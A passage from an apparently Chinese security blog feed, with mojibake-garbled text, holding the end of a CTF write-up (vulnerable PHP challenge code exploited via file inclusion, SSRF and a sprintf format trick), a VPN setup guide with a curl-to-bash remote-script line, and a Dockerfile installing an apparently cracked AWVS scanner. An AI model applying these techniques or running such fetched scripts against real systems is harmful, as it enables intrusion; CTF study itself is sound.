title="xss"></a>xss</h3><p>sbé¢˜ç›®</p><p>index.php</p><pre><code class="php">&lt;?php   $a=$_GET[&#39;yds_is_so_beautiful&#39;];    echo unserialize($a);   ?&gt;</code></pre><h3 id="æ–‡ä»¶æ¢æµ‹"><a href="#æ–‡ä»¶æ¢æµ‹" class="headerlink" title="æ–‡ä»¶æ¢æµ‹"></a>æ–‡ä»¶æ¢æµ‹</h3><p>httpå¤´ä¸­æ‰¾åˆ°hint:<code>home.php</code></p><pre><code>http://3801f870-f245-47ef-8325-1e117f384eb8.node3.buuoj.cn/home.php?file=system</code></pre><p>å°è¯•æ–‡ä»¶åŒ…å«,æ‹¿åˆ°æºç </p><pre><code class="php">&lt;?phperror_reporting(0);if (!isset($_COOKIE[&#39;y1ng&#39;]) || $_COOKIE[&#39;y1ng&#39;] !== sha1(md5(&#39;y1ng&#39;))){    echo &quot;&lt;script&gt;alert(&#39;why you are here!&#39;);alert(&#39;fxck your scanner&#39;);alert(&#39;fxck you! get out!&#39;);&lt;/script&gt;&quot;;    header(&quot;Refresh:0.1;url=index.php&quot;);    die;}$str2 = &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br&gt;~$ &#39;;$str3 = &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br&gt;~$ &#39;;$str4 = &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br&gt;~$ &#39;;?&gt;&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;    &lt;title&gt;File Detector&lt;/title&gt;    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/normalize.css&quot; /&gt;    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/demo.css&quot; /&gt;    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/component.css&quot; /&gt;    &lt;script src=&quot;js/modernizr.custom.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;section&gt;    &lt;form id=&quot;theForm&quot; class=&quot;simform&quot; autocomplete=&quot;off&quot; action=&quot;system.php&quot; method=&quot;post&quot;&gt;        &lt;div class=&quot;simform-inner&quot;&gt;            &lt;span&gt;&lt;p&gt;&lt;center&gt;File Detector&lt;/center&gt;&lt;/p&gt;&lt;/span&gt;            &lt;ol class=&quot;questions&quot;&gt;                &lt;li&gt;                    &lt;span&gt;&lt;label for=&quot;q1&quot;&gt;Ã¤Â½ Ã§ÂŸÂ¥Ã©ÂÂ“Ã§Â›Â®Ã¥Â½Â•Ã¤Â¸Â‹Ã©ÂƒÂ½Ã¦ÂœÂ‰Ã¤Â»Â€Ã¤Â¹ÂˆÃ¦Â–Â‡Ã¤Â»Â¶Ã¥ÂÂ—?&lt;/label&gt;&lt;/span&gt;                    &lt;input id=&quot;q1&quot; name=&quot;q1&quot; type=&quot;text&quot;/&gt;                &lt;/li&gt;                &lt;li&gt;                    &lt;span&gt;&lt;label for=&quot;q2&quot;&gt;Ã¨Â¯Â·Ã¨Â¾Â“Ã¥Â…Â¥Ã¤Â½ Ã¦ÂƒÂ³Ã¦Â£Â€Ã¦ÂµÂ‹Ã¦Â–Â‡Ã¤Â»Â¶Ã¥Â†Â…Ã¥Â®Â¹Ã©Â•Â¿Ã¥ÂºÂ¦Ã§ÂšÂ„url&lt;/label&gt;&lt;/span&gt;                    &lt;input id=&quot;q2&quot; name=&quot;q2&quot; type=&quot;text&quot;/&gt;                &lt;/li&gt;                &lt;li&gt;                    &lt;span&gt;&lt;label for=&quot;q1&quot;&gt;Ã¤Â½ Ã¥Â¸ÂŒÃ¦ÂœÂ›Ã¤Â»Â¥Ã¤Â½Â•Ã§Â§ÂÃ¦Â–Â¹Ã¥Â¼ÂÃ¨Â®Â¿Ã©Â—Â®Ã¯Â¼ÂŸGETÃ¯Â¼ÂŸPOST?&lt;/label&gt;&lt;/span&gt;                    &lt;input id=&quot;q3&quot; name=&quot;q3&quot; type=&quot;text&quot;/&gt;                &lt;/li&gt;            &lt;/ol&gt;            &lt;button class=&quot;submit&quot; type=&quot;submit&quot; value=&quot;submit&quot;&gt;Ã¦ÂÂÃ¤ÂºÂ¤&lt;/button&gt;            &lt;div class=&quot;controls&quot;&gt;                &lt;button class=&quot;next&quot;&gt;&lt;/button&gt;                &lt;div class=&quot;progress&quot;&gt;&lt;/div&gt;                &lt;span class=&quot;number&quot;&gt;                    &lt;span class=&quot;number-current&quot;&gt;&lt;/span&gt;                    &lt;span class=&quot;number-total&quot;&gt;&lt;/span&gt;                &lt;/span&gt;                &lt;span class=&quot;error-message&quot;&gt;&lt;/span&gt;            &lt;/div&gt;        &lt;/div&gt;        &lt;span class=&quot;final-message&quot;&gt;&lt;/span&gt;    &lt;/form&gt;    &lt;span&gt;&lt;p&gt;&lt;center&gt;&lt;a href=&quot;https://gem-love.com&quot; target=&quot;_blank&quot;&gt;@Ã©Â¢Â–Ã¥Â¥Â‡L&#39;Amore&lt;/a&gt;&lt;/center&gt;&lt;/p&gt;&lt;/span&gt;&lt;/section&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;js/classie.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;js/stepsForm.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt;    var theForm = document.getElementById( &#39;theForm&#39; );    new stepsForm( theForm, {        onSubmit : function( form ) {            classie.addClass( theForm.querySelector( &#39;.simform-inner&#39; ), &#39;hide&#39; );            var messageEl = theForm.querySelector( &#39;.final-message&#39; );            form.submit();            messageEl.innerHTML = &#39;Ok...Let me have a check&#39;;            classie.addClass( messageEl, &#39;show&#39; );        }    } );&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php$filter1 = &#39;/^http:\/\/127\.0\.0\.1\//i&#39;;$filter2 = &#39;/.?f.?l.?a.?g.?/i&#39;;if (isset($_POST[&#39;q1&#39;]) &amp;&amp; isset($_POST[&#39;q2&#39;]) &amp;&amp; isset($_POST[&#39;q3&#39;]) ) {    $url = $_POST[&#39;q2&#39;].&quot;.y1ng.txt&quot;;    $method = $_POST[&#39;q3&#39;];    $str1 = &quot;~$ python fuck.py -u \&quot;&quot;.$url .&quot;\&quot; -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;&quot;;    echo $str1;    if (!preg_match($filter1, $url) ){        die($str2);    }    if (preg_match($filter2, $url)) {        die($str3);    }    if (!preg_match(&#39;/^GET/i&#39;, $method) &amp;&amp; !preg_match(&#39;/^POST/i&#39;, $method)) {        die($str4);    }    $detect = @file_get_contents($url, false);    print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));}?&gt;</code></pre><p>home.php</p><pre><code class="php">&lt;?phpsetcookie(&quot;y1ng&quot;, sha1(md5(&#39;y1ng&#39;)), time() + 3600);setcookie(&#39;your_ip_address&#39;, md5($_SERVER[&#39;REMOTE_ADDR&#39;]), time()+3600);if(isset($_GET[&#39;file&#39;])){    if (preg_match(&quot;/\^|\~|&amp;|\|/&quot;, $_GET[&#39;file&#39;])) {        die(&quot;forbidden&quot;);    }    if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET[&#39;file&#39;])){        die(&quot;not now!&quot;);    }    if(preg_match(&quot;/.?a.?d.?m.?i.?n.?/i&quot;, $_GET[&#39;file&#39;])){        die(&quot;You! are! not! my! admin!&quot;);    }    if(preg_match(&quot;/^home$/i&quot;, $_GET[&#39;file&#39;])){        die(&quot;ä¸è¦å¥—å¨ƒ&quot;);    }    else{        if(preg_match(&quot;/home$/i&quot;, $_GET[&#39;file&#39;]) or preg_match(&quot;/system$/i&quot;, $_GET[&#39;file&#39;])){            $file = $_GET[&#39;file&#39;].&quot;.php&quot;;        }        else{            $file = $_GET[&#39;file&#39;].&quot;.fxxkyou!&quot;;        }        echo &quot;ä½ ç°åœ¨è®¿é—®çš„æ˜¯&quot;.$file . &quot;&lt;br&gt;&quot;;        require $file;    }} else {    echo &quot;&lt;script&gt;location.href=&#39;./home.php?file=system&#39;&lt;/script&gt;&quot;;}</code></pre><p>æˆ‘ä»¬çœ‹åˆ°:</p><pre><code class="php">$filter1 = &#39;/^http:\/\/127\.0\.0\.1\//i&#39;;$filter2 = &#39;/.?f.?l.?a.?g.?/i&#39;;    if (!preg_match($filter1, $url) ){        die($str2);    }    if (preg_match($filter2, $url)) {        die($str3);    }    if (!preg_match(&#39;/^GET/i&#39;, $method) &amp;&amp; !preg_match(&#39;/^POST/i&#39;, $method)) {        die($str4);    }    $detect = @file_get_contents($url, false);    print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));</code></pre><p>æˆ‘ä»¬åˆ©ç”¨<code>$method</code>æ¥è½¬ä¹‰<code>%d</code>,åœ¨<code>$url</code>ä¸­åŠ ä¸ª<code>%s</code>å°±å¯ä»¥æŸ¥çœ‹ssrfçš„å†…å®¹äº†</p><p>æ‰«æç›®å½•å‘ç°:admin.php,ä½†æ˜¯è¦ä»å†…ç½‘è®¿é—®</p><p>ssrfè®¿é—®å¾—åˆ°</p><pre><code class="php">0 &lt;?phperror_reporting(0);session_start();$f1ag = &#39;f1ag{s1mpl3_SSRF_@nd_spr1ntf}&#39;; //fakefunction aesEn($data, $key){    $method = &#39;AES-128-CBC&#39;;    $iv = md5($_SERVER[&#39;REMOTE_ADDR&#39;],true);    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));}function Check(){    if (isset($_COOKIE[&#39;your_ip_address&#39;]) &amp;&amp; $_COOKIE[&#39;your_ip_address&#39;] === md5($_SERVER[&#39;REMOTE_ADDR&#39;]) &amp;&amp; $_COOKIE[&#39;y1ng&#39;] === sha1(md5(&#39;y1ng&#39;)))        return true;    else        return false;}if ( $_SERVER[&#39;REMOTE_ADDR&#39;] == &quot;127.0.0.1&quot; ) {    highlight_file(__FILE__);} else {    echo &quot;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size=&#39;10px&#39; color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is &quot; . $_SERVER[&#39;REMOTE_ADDR&#39;];}$_SESSION[&#39;user&#39;] = md5($_SERVER[&#39;REMOTE_ADDR&#39;]);if (isset($_GET[&#39;decrypt&#39;])) {    $decr = $_GET[&#39;decrypt&#39;];    if (Check()){        $data = $_SESSION[&#39;secret&#39;];        include &#39;flag_2sln2ndln2klnlksnf.php&#39;;        $cipher = aesEn($data, &#39;y1ng&#39;);        if ($decr === $cipher){            echo WHAT_YOU_WANT;        } else {            die(&#39;çˆ¬&#39;);        }    } else{        header(&quot;Refresh:0.1;url=index.php&quot;);    }} else {    //I heard you can break PHP mt_rand seed    mt_srand(rand(0,9999999));    $length = mt_rand(40,80);    $_SESSION[&#39;secret&#39;] = bin2hex(random_bytes($length));}?&gt;</code></pre><p>æˆ‘ä»¬å‘ç°å¦‚æœæˆ‘ä»¬å¸¦decryptå‚æ•°ç›´æ¥è®¿é—®,å°±ä¸ä¼šç”Ÿæˆsecretäº†,é‚£ä¹ˆ<code>$cipher = aesEn(&#39;&#39;, &#39;y1ng&#39;);</code></p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/03/25/BJDCTF/">http://blog.ccreater.top/2020/03/25/BJDCTF/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vpnæ­å»º</title>
      <link href="/2020/03/20/vpn%E6%90%AD%E5%BB%BA/"/>
      <url>/2020/03/20/vpn%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="vpnæ­å»ºå°è®°"><a href="#vpnæ­å»ºå°è®°" class="headerlink" title="vpnæ­å»ºå°è®°"></a>vpnæ­å»ºå°è®°</h1><p>åˆšå¥½æœ€è¿‘æœ‰äººå«æˆ‘å¸®å¿™æ­ä¸ªvpnè‡ªå·±å»äº†è§£äº†ä¸€ä¸‹,å‘ç°æ­vpnè¿˜æŒºæœ‰æ„æ€çš„</p><h2 id="vpnçš„æœ€ç»ˆæ–¹æ¡ˆ"><a href="#vpnçš„æœ€ç»ˆæ–¹æ¡ˆ" class="headerlink" title="vpnçš„æœ€ç»ˆæ–¹æ¡ˆ"></a>vpnçš„æœ€ç»ˆæ–¹æ¡ˆ</h2><p>ç»è¿‡è‡ªå·±çæŠ˜è…¾åæœ€åæ˜¯ææˆè¿™æ ·çš„:</p><p>å®¶å®½-å†…åœ°ä¸­è½¬æœåŠ¡å™¨-gfw-å›½å¤–vps(ä½¿ç”¨trojan+bbr)</p><p>ä»¥åæ‰“ç®—åœ¨gfwå’Œå›½å¤–vpsåœ¨åŠ ä¸ªcdn,è¿™æ ·æˆ‘ä»¬vpså¯¹gfwä¹Ÿå°±æ˜¯é€æ˜çš„äº†,ä»¥ågfwæŠŠæˆ‘ä»¬vpsçš„ip banæ‰äº†ä¹Ÿæ²¡å…³ç³»,ä¸å¤ªå¥½çš„å½±å“å°±æ˜¯å»¶è¿Ÿä¼šå˜é«˜</p><p>è¿™é‡ŒåŠ ä¸ªä¸­è½¬æœåŠ¡å™¨æ˜¯å› ä¸ºç”µä¿¡æ™šä¸Šç½‘ç»œä¼šç‚¸è£‚,è€Œå®¶å®½å°±æ˜¯ç”µä¿¡,è™½ç„¶æ‰‹æœºæ˜¯è”é€šçš„,ä½†æ˜¯æˆ‘è‡ªå·±ä¸€ä¸ªæœˆ40gæµé‡éƒ½ä¸å¤Ÿç”¨</p><blockquote><p>ç”µä¿¡ 163 ç½‘è¿æ¥å›½é™…ç½‘ç»œï¼Œä¼šåœ¨é«˜å³°æ—¶æ®µï¼Œåœ¨è·¯ç”±å‡ºæµ·å‰çš„æœ€åä¸€è·³ï¼Œæ ¹æ®ä¼˜å…ˆçº§ï¼Œç­–ç•¥æ€§åœ°äººä¸ºä¸¢åŒ…ï¼Œä»¥å‡è½»å¯¹ä¸»ç½‘çš„è´Ÿæ‹…(QOS)ï¼Œè¿™è®©æ™®é€šç”µä¿¡ç”¨æˆ·ç³Ÿç³•çš„å¤–ç½‘è®¿é—®è´¨é‡é›ªä¸ŠåŠ éœœ </p></blockquote><h2 id="vpnæ­å»ºå…·ä½“ç»†èŠ‚"><a href="#vpnæ­å»ºå…·ä½“ç»†èŠ‚" class="headerlink" title="vpnæ­å»ºå…·ä½“ç»†èŠ‚"></a>vpnæ­å»ºå…·ä½“ç»†èŠ‚</h2><h3 id="å›½å¤–vpsé€‰è´­"><a href="#å›½å¤–vpsé€‰è´­" class="headerlink" title="å›½å¤–vpsé€‰è´­"></a>å›½å¤–vpsé€‰è´­</h3><p>é¦–å…ˆæ˜¯vpnçš„é€‰è´­,å› ä¸ºæ˜¯èŒæ–°,å°±å»äº†åˆ«äººæ¨èçš„vultr,æ¬ç“¦å·¥å¤ªè´µäº†</p><p>å¬è¯´vultré”€æ¯æœåŠ¡å™¨,å†é‡æ–°è´­ä¹°ä¼šæœ‰æ–°çš„ip,ä½†æ˜¯æˆ‘è¿™æ ·å¼„è¿˜æ˜¯åŒä¸€ä¸ªè¢«banæ‰çš„ip,åæ¥å°è„‘ç“œä¸€åŠ¨,æˆ‘ä¸€å£æ°”å¼€äº†10ä¸ªæœåŠ¡å™¨,è¿™æ ·ipå°±ä¸ä¸€æ ·äº†,æˆ‘çœŸtmæœºæ™º/cy</p><p>å…·ä½“æ€ä¹ˆé€‰è´­å°±ç™¾åº¦è°·æ­Œå§</p><h3 id="å›½å¤–vpsé…ç½®"><a href="#å›½å¤–vpsé…ç½®" class="headerlink" title="å›½å¤–vpsé…ç½®"></a>å›½å¤–vpsé…ç½®</h3><p>è¿™é‡Œç”¨æ³¢ä»”æä¾›çš„ä¸€é”®å®‰è£…è„šæœ¬,çœ‹äº†ä¸€ä¸‹æ²¡å•¥å®‰å…¨é—®é¢˜</p><p> <a href="https://www.v2rayssr.com/trojan-1.html/comment-page-1" target="_blank" rel="noopener">https://www.v2rayssr.com/trojan-1.html/comment-page-1</a> </p><p>è¿™é‡Œä½ è¿˜éœ€è¦ä¸€ä¸ªåŸŸå,å»ºè®®ç”¨äºŒçº§åŸŸåæ¥å¼„trojan</p><blockquote><ol><li><p><code>bash &lt;(curl -s -L https://github.com/V2RaySSR/Trojan/raw/master/Trojan.sh)</code></p></li><li><p>å…ˆå®‰è£…bbr,é™¤äº†é‡å¯çš„é€‰y,å…¶ä»–éƒ½é€‰no</p></li><li><p>å†æ¬¡è¿è¡Œè„šæœ¬,è¿è¡Œbbr,å¹¶ä¼˜åŒ–é…ç½®</p></li><li><p>å®‰è£…trojan</p></li><li><p>ä¸‹è½½å®¢æˆ·ç«¯</p></li></ol></blockquote><p>è§†é¢‘æ•™ç¨‹: <a href="https://www.youtube.com/watch?v=LgZKirXKZms&amp;feature=youtu.be" target="_blank" rel="noopener">https://www.youtube.com/watch?v=LgZKirXKZms&amp;feature=youtu.be</a> </p><h3 id="ä¸­è½¬æœåŠ¡å™¨é…ç½®"><a href="#ä¸­è½¬æœåŠ¡å™¨é…ç½®" class="headerlink" title="ä¸­è½¬æœåŠ¡å™¨é…ç½®"></a>ä¸­è½¬æœåŠ¡å™¨é…ç½®</h3><p>ä¸­è½¬æœåŠ¡å™¨å»ä¹°å…±äº«ç«¯å£+dockerè™šæ‹Ÿæœºçš„é‚£ç§,ä¸€ä¸ªæœˆ5å…ƒå·¦å³å§,å‡ºå£æœ€å¥½è”é€š</p><p>xxx.sh</p><pre><code class="shell">#!/bin/bashif [ ! $# -eq 3 ];then    echo -e &quot;Usage : $0 natport trojanserver trojanport&quot;    exitfinatport=$1trojanserver=$2trojanport=$3apt-get install iptables || yum install iptablesiptables -t nat -A PREROUTING -p tcp --dport $natport  -j DNAT --to-destination &quot;$trojanserver:$trojanport&quot;iptables -t nat -A POSTROUTING -d $trojanserver -p tcp --dport $trojanport -j MASQUERADEiptables -I FORWARD -d $trojanserver -p tcp --dport  $trojanport -j ACCEPTiptables -I FORWARD -s $trojanserver  -p tcp --sport  $trojanport -j ACCEPTservice iptables saveservice iptables restartecho &quot;setting complete&quot;</code></pre><h3 id="å®¢æˆ·ç«¯é…ç½®"><a href="#å®¢æˆ·ç«¯é…ç½®" class="headerlink" title="å®¢æˆ·ç«¯é…ç½®"></a>å®¢æˆ·ç«¯é…ç½®</h3><p>å°†config.jsonæ‹·è´ä¸€ä»½,config_through_nat.json</p><p>å¹¶åšå‡ºå¦‚ä¸‹ä¿®æ”¹</p><pre><code class="json">{    ...    &quot;remote_addr&quot;: &quot;ä¸­è½¬æœåŠ¡å™¨ip&quot;,    &quot;remote_port&quot;: ä¸­è½¬çš„ç«¯å£,   ...    &quot;ssl&quot;: {        &quot;verify&quot;: false,        &quot;verify_hostname&quot;: false,        ...    }    ...}</code></pre><p>config.jsoné‡å‘½åä¸º:config_normal.json</p><p>start.bat</p><pre><code class="shell">@ECHO OFFtaskkill /im trojan.exe /fping -n 2 127.1 &gt;nulcopy /Y config_normal.json config.json%1 start mshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;&quot;&quot;%~0&quot;&quot; ::&quot;,0)(window.close)&amp;&amp;exitstart /b trojan.exe</code></pre><p>start_with_nat.bat</p><pre><code class="shell">@ECHO OFFtaskkill /im trojan.exe /fping -n 2 127.1 &gt;nulcopy /Y config_through_nta.json config.json%1 start mshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;&quot;&quot;%~0&quot;&quot; ::&quot;,0)(window.close)&amp;&amp;exitstart /b trojan.exe</code></pre><p>å°†ä¸¤ä¸ªæ‰¹å¤„ç†æ”¾åˆ°trojanå®¢æˆ·ç«¯ç›®å½•ä¸‹</p><h2 id="vpnæµ‹è¯•"><a href="#vpnæµ‹è¯•" class="headerlink" title="vpnæµ‹è¯•"></a>vpnæµ‹è¯•</h2><p>é€šè¿‡ <a href="https://fast.com/" target="_blank" rel="noopener">https://fast.com/</a>  æ¥æµ‹é€Ÿ ç¨³å®š10Mbits(è”é€š),5Mbits(ç”µä¿¡å¹³æ—¶),500Kbits(ç”µä¿¡å¤œé—´,ä¸¢åŒ…ç‡è´¼é«˜,ä½“éªŒæå·®),ç¨³å®š1Mbits(èµ°ä¸­è½¬æœåŠ¡å™¨è·¯çº¿,å› ä¸ºæˆ‘ä¸“é—¨æ‹¿æ¥ä¸­è½¬çš„æœåŠ¡å™¨è¿˜æ²¡ä¹°,æš‚æ—¶ç›´æ¥ç”¨é˜¿é‡Œäº‘çš„æœåŠ¡å™¨æ¥ä¸­è½¬,ä½†æ˜¯é˜¿é‡Œäº‘æœåŠ¡å™¨ä¹Ÿåœ¨ç”µä¿¡æœºæˆ¿),å»ä¹°äº†ä¸ªä¸­è½¬çš„æœåŠ¡å™¨ç°åœ¨å¤œé—´ç”µä¿¡ç¨³å®š5Mbits</p><p>åˆ©ç”¨BEST TRACEæ¥çœ‹vpsçš„çº¿è·¯</p><p>å„ç§çº¿è·¯çš„åˆ†ææ–‡ç« : <a href="https://www.duangvps.com/archives/135" target="_blank" rel="noopener">https://www.duangvps.com/archives/135</a> </p><p>youtubeæ‰“å¼€4kè§†é¢‘å³é”®æŸ¥çœ‹ç»Ÿè®¡ä¿¡æ¯,æˆ‘çš„æ˜¯5wå·¦å³</p><p>linuxå›ç¨‹è·¯ç”±æµ‹è¯•: <a href="https://github.com/nanqinlang-script/testrace" target="_blank" rel="noopener">https://github.com/nanqinlang-script/testrace</a> </p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/03/20/vpnæ­å»º/">http://blog.ccreater.top/2020/03/20/vpnæ­å»º/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ‚ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>dockeréƒ¨ç½²awvs</title>
      <link href="/2020/03/18/docker%E9%83%A8%E7%BD%B2awvs/"/>
      <url>/2020/03/18/docker%E9%83%A8%E7%BD%B2awvs/</url>
      
        <content type="html"><![CDATA[<h1 id="dockeréƒ¨ç½²awvs"><a href="#dockeréƒ¨ç½²awvs" class="headerlink" title="dockeréƒ¨ç½²awvs"></a>dockeréƒ¨ç½²awvs</h1><p>é“¾æ¥: <a href="https://pan.baidu.com/s/1QqtdmgOOd-CCPgmD1aZMCw" target="_blank" rel="noopener">https://pan.baidu.com/s/1QqtdmgOOd-CCPgmD1aZMCw</a> æå–ç : buti </p><p>å°†ç™¾åº¦äº‘ä¸‹è½½å†…å®¹æ”¾åˆ°awvsæ–‡ä»¶å¤¹ä¸‹</p><p>Dockerfile</p><pre><code class="dockerfile">FROM ubuntu:16.04COPY awvs /awvsEXPOSE 3443RUN /awvs/setenv.sh&amp;&amp; echo -e &quot;\nyes\nubuntu\nccreater@163.com\nccr,123456\nccr,123456\n&quot;|/awvs/acunetix_13.0.200217097_x64_.sh &amp;&amp; \cp /awvs/wvsc /home/acunetix/.acunetix/v_200217097/scanner/wvsc &amp;&amp;\cp /awvs/license_info.json  /home/acunetix/.acunetix/data/license/license_info.json &amp;&amp;\echo -e &#39;#!/bin/bash\nsu acunetix &amp;&amp; (nohup bash ~/.acunetix/start.sh &amp;) &amp;&amp; exit&#39;&gt; /etc/rc.local</code></pre><p>setenv.sh</p><pre><code class="shell">#!/bin/bashshared_obj_deps=(libpango-1.0.so.0 libXext.so.6 libpthread.so.0 libXi.so.6 libgobject-2.0.so.0 libgtk-3.so.0 libdl.so.2 libgdk_pixbuf-2.0.so.0 libX11.so.6 libuuid.so.1 librt.so.1 libexpat.so.1 libglib-2.0.so.0 libXdamage.so.1 libatk-1.0.so.0 libm.so.6 libatspi.so.0 libcups.so.2 libgio-2.0.so.0 libXfixes.so.3 libXrender.so.1 libxcb.so.1 libsmime3.so libcairo.so.2 libXcomposite.so.1 libgdk-3.so.0 libpangocairo-1.0.so.0 libgcc_s.so.1 libX11-xcb.so.1 libdbus-1.so.3 libnss3.so libXrandr.so.2 libnspr4.so libXcursor.so.1 libnssutil3.so libXss.so.1 libasound.so.2 libatk-bridge-2.0.so.0 libc.so.6 libXtst.so.6)read -d &#39;&#39; source &lt;&lt;EOFdeb-src http://archive.ubuntu.com/ubuntu xenial main restricted #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial universedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates universedeb http://mirrors.aliyun.com/ubuntu/ xenial multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse #Added by software-propertiesdeb http://archive.canonical.com/ubuntu xenial partnerdeb-src http://archive.canonical.com/ubuntu xenial partnerdeb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial-security universedeb http://mirrors.aliyun.com/ubuntu/ xenial-security multiverseEOFecho &quot;$source&quot; &gt; /etc/apt/sources.list cat /etc/apt/sources.list apt-get update#for i in ${shared_obj_deps[@]}#do#    echo install $i#    apt-get install $i -y#doneapt-get install libxdamage1 libgtk-3-0 libasound2 libnss3 libxss1 bzip2 sudo libv8-dev -yecho &quot;install success&quot;</code></pre><p>å°†Dockerfileæ”¾åœ¨awvsåŒçº§ç›®å½•ä¸‹,æ‰“å¼€å‘½ä»¤è¡Œç§»åŠ¨åˆ°Dockerfileæ‰€åœ¨æ–‡ä»¶å¤¹,<code>docker build -t awvs .</code></p><p>ç”¨Dockerfileåˆ›å»ºé•œåƒå,ç”¨<code>docker run --privileged=true -p 443:3443-it -d awvs &quot;/sbin/init&quot;</code>æ¥åˆ›å»ºå®¹å™¨</p><p>æ¥ç€ç­‰å¾…ä¸€ä¼šå°±å¯ä»¥è¿è¡Œäº†,åœ¨æ”¹ä¸€ä¸‹æœ¬æœºçš„hosts,ç¾æ»‹æ»‹,è®°å¾—æ˜¯ç”¨httpså»è®¿é—®</p><p><img src="https://i.loli.net/2020/03/18/5nruJk7RmfLYjtw.png" alt="image3135"></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p> <a href="https://youngrichog.github.io/2019/08/10/Docker-AWVSæ‰¹é‡éƒ¨ç½²/" target="_blank" rel="noopener">https://youngrichog.github.io/2019/08/10/Docker-AWVS%E6%89%B9%E9%87%8F%E9%83%A8%E7%BD%B2/</a> </p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/03/18/dockeréƒ¨ç½²awvs/">http://blog.ccreater.top/2020/03/18/dockeréƒ¨ç½²awvs/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ‚ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xctfé«˜æ ¡æŠ—ç–«</title>
